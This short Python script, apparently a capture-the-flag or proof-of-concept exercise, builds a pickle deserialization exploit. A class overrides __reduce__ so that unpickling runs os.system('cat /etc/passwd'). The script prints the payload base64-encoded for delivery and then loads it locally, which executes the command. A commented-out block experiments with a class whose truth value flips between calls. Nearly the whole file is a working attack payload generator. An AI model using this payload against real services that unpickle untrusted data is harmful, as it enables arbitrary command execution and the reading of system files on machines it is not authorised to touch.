import pickle
import base64

class RunCmd(object):
    def __reduce__(self):
        import os
        return(os.system,
                (('cat /etc/passwd'),))

data = RunCmd()
pkd = pickle.dumps(RunCmd())
print(base64.b64encode(pickle.dumps(RunCmd())))

d = pickle.loads(pkd)
print(d)


# class Foo:
#     def __init__(self):
#         self.first = True

#     def __bool__(self):
#         if self.first:
#             self.first = False
#             return True
#         return False
    
#     def __len__(self):
#         return 0


# data = Foo()

# with open('data.pickle', 'wb') as handle:
#     pickle.dump(data, handle, fix_imports=True)